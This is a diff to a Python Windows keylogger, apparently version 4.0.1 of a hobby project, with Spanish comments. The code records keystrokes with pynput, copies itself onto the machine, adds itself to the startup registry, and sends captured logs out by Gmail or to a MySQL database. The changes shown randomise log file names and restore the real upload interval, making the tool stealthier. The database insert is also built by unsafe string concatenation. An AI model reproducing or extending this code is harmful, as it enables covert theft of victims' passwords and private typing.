@@ -10,7 +10,7 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v4.0
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v4.0.1
 
 # Librerías Utilizadas
 from pynput.keyboard import Key, Listener
@@ -19,10 +19,12 @@ from getpass import getuser # Obtiene el nombre del usuario
 from datetime import datetime
 from winreg import *
 import datetime
+import random
 import os
 import yagmail
 import pymysql  # Lib connection mysql
 import shutil
+import string
 import time
 import threading # Hilos
 import socket    # Librería verifica internet 
@@ -281,6 +283,9 @@ def CreateDir():
 
 # Intervalo de tiempo que se enviará el archivo reg.k
 def SendLog():
+    def random_char(y=5):
+           return ''.join(random.choice(string.ascii_letters) for x in range(y))
+
     # Función = Verifica si hay conexión a internet para poder envíar el log
     def VerificarConexion():
         con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
@@ -328,7 +333,7 @@ def SendLog():
         def UpdateUser():
             try:
                 pathO = logKeyPath()+ LogName()
-                pathN = logKeyPath()+ "db.txt"
+                pathN = logKeyPath()+ random_char(15)+".txt"
                 os.rename(pathO, pathN)
                 # Abre el archivo
                 f = open (pathN ,'r')
@@ -337,8 +342,8 @@ def SendLog():
                 print(data)
                 # Tiempo
                 T = datetime.datetime.now()
-                #currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
-                currentTime = "Hora"
+                currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B")+" "+ T.strftime("%I")+ ":"+ T.strftime("%M")+ " "+ T.strftime("%p")
+
                 sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES('"+str(getuser())+"','"+currentTime+"','"+data+"')"    # Inserta nuevos datos 
                 #sql = "Update NameTabla SET key = '{}'WHERE id={}".format(name, id)
                 
@@ -353,21 +358,22 @@ def SendLog():
                     print("[Database] Error al subir los datos")
 
             except:
+                try:
+                        os.remove(pathN)  # Borra la carpeta por posible Errores
+                    except:
+                        pass
                 print("[DataBase] No se encuentra el archivo")
 
         if (exito): # Solo se ejecutará si se inició correctamente la base de datos
             UpdateUser()
         #print("[DataBase]=> "+str(exito))
-    
-    n = 1   # Para renombre los archivos
+
     while (True):
-        #time.sleep(timeSend()*60) # Tiempo de espera por minutos 
-        time.sleep(15) # borra esta linea
+        time.sleep(timeSend()*60) # Tiempo de espera por minutos 
         if VerificarConexion():
             if (GMailOrDataBase() == 0):    # Send mail
-                n = n+1
                 # Crea nombre del archivo
-                nameFile = str(getuser())+" "+str(n)+".txt"
+                nameFile = str(getuser())+"-"+random_char(8)+".txt"
                 #Renombra el archivo original
                 Rename(nameFile)    # Cambia el archivo `reg.k` a  `log2.txt`
 
@@ -463,7 +469,7 @@ def timeSend(): # Tiempo de envío perzonalizado
 
 # Inicio multihilo
 if __name__ == '__main__':
-
+    
     EscondeKey()    # Se replica dentro de la computadora
     addStartup()    # Modifica registro de arranque
     p1 = threading.Thread(target=KeyLogger)   # Registra teclas
@@ -478,7 +484,7 @@ if __name__ == '__main__':
 #################################################################
 #                                                               #
 #                 Developed by SebastianEPH                     #
-#                                                   v4.0   #
+#                                                   v4.0.1      #
 #################################################################
 # NOTAS IMPORTANTES:
 #
